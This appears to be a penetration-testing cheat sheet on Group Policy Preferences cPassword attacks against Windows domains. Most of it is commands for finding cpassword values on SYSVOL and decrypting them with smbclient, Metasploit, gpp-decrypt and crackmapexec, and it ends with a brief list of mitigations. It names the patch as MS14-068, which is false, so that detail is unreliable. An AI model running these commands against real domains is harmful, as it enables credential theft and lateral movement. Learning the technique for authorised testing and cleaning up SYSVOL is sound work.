# GPP / cPassword Attacks

Group Policy Preferences (GPP) allowed admins to set local admin passwords via Group Policy. Microsoft published the AES key used to encrypt these passwords -- making them trivially decryptable.

## Background

- GPP stored in SYSVOL share (readable by all domain users)
- Passwords encrypted with AES-256, but Microsoft published the key
- Patched in MS14-068, but old policies may still exist
- The XML files may still be on SYSVOL even after patching

## Finding GPP Passwords

### Manual Check

```bash
# Browse SYSVOL share
smbclient //DC_IP/SYSVOL -U 'DOMAIN/username'

# Look for Groups.xml, Services.xml, Scheduledtasks.xml, etc.
# Search for "cpassword" in XML files
```

### With Metasploit

```bash
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS DC_IP
set SMBUser username
set SMBPass password
run
```

### With gpp-decrypt

```bash
# Once you find a cpassword value
gpp-decrypt ENCRYPTED_PASSWORD_STRING
```

### With crackmapexec

```bash
crackmapexec smb DC_IP -u username -p 'password' -M gpp_password
```

## Mitigations

- Delete old GPP XML files from SYSVOL
- Use LAPS for local admin password management
- Audit SYSVOL for leftover credential files
